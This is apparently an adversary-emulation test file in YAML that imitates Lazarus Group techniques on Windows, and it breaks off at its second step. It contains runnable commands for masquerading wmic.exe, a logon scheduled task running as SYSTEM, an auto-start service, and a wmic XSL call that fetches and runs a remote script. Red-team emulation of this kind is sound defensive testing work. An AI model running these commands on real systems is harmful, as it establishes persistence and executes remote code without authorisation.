# Scenario 1 - Lazarus Group Emulation

# Step 1 - Defense Evasion and Persistence

- id: c89e24f1-678a-4d73-8201-987d6e4b9a30
  name: Masquerading - wmic.exe as ncv.exe
  description: Copy wmic.exe to a temp directory as ncv.exe to evade detection based on process name.
  tactic: defense-evasion
  technique:
    attack_id: T1036.005
    name: "Masquerading: Match Legitimate Name or Location"
  cti_source: "AttackIQ Intelligence"
  procedure_group: procedure_defense_evasion
  procedure_step: "1.A"
  platforms:
    windows:
      psh,pwsh:
        command: |
          $dir = Join-Path $env:TEMP "T1036_005_test"
          New-Item -ItemType Directory -Force -Path $dir | Out-Null
          $source = "$env:SystemRoot\System32\wbem\wmic.exe"
          $target = "$dir\ncv.exe"
          Copy-Item -Path $source -Destination $target -Force
          & $target os get Caption,Version

  executors:
  - name: powershell
    command: |
      $dir = Join-Path $env:TEMP "T1036_005_test"
      New-Item -ItemType Directory -Force -Path $dir | Out-Null
      $source = "$env:SystemRoot\System32\wbem\wmic.exe"
      $target = "$dir\ncv.exe"
      Copy-Item -Path $source -Destination $target -Force
      & $target os get Caption,Version

- id: 42a9b3d7-8e6f-412c-9a4f-5573428c0b11
  name: Scheduled Task - HPSync
  description: Create a scheduled task named HPSync that triggers on logon to establish persistence.
  tactic: persistence
  technique:
    attack_id: T1053.005
    name: "Scheduled Task/Job: Scheduled Task"
  cti_source: "AttackIQ Intelligence"
  procedure_group: procedure_persistence
  procedure_step: "1.B"
  platforms:
    windows:
      cmd:
        command: |
          schtasks /create /tn "HPSync" /tr "cmd.exe /c echo Lazarus_Emulation_Task_Triggered" /sc onlogon /ru System /f

  executors:
  - name: command_prompt
    command: |
      schtasks /create /tn "HPSync" /tr "cmd.exe /c echo Lazarus_Emulation_Task_Triggered" /sc onlogon /ru System /f

- id: 714d691e-3b2a-485c-a189-23ef6d9b4c85
  name: XSL Script Processing via WMIC
  description: Execute arbitrary XSL script hosted remotely via WMIC.
  tactic: defense-evasion
  technique:
    attack_id: T1220
    name: "XSL Script Processing"
  cti_source: "AttackIQ Intelligence"
  procedure_group: procedure_defense_evasion
  procedure_step: "1.C"
  platforms:
    windows:
      cmd:
        command: |
          wmic os get /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"

  executors:
  - name: command_prompt
    command: |
      wmic os get /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"

- id: a92f8b54-93c6-47e1-884b-01649dc2fa7b
  name: Create Windows Service via sc
  description: Establish persistence by creating and starting a new Windows service.
  tactic: persistence
  technique:
    attack_id: T1543.003
    name: "Create or Modify System Process: Windows Service"
  cti_source: "AttackIQ Intelligence"
  procedure_group: procedure_persistence
  procedure_step: "1.D"
  platforms:
    windows:
      cmd:
        command: |
          sc create "LazarusTestSvc" binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto
          sc start "LazarusTestSvc"

  executors:
  - name: command_prompt
    command: |
          sc create "LazarusTestSvc" binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= auto
          sc start "LazarusTestSvc"

# Step 2 - Proxy Execution and Discovery

- id: eb38971f-4c5d-4a1e-b873-195c6a2b8470
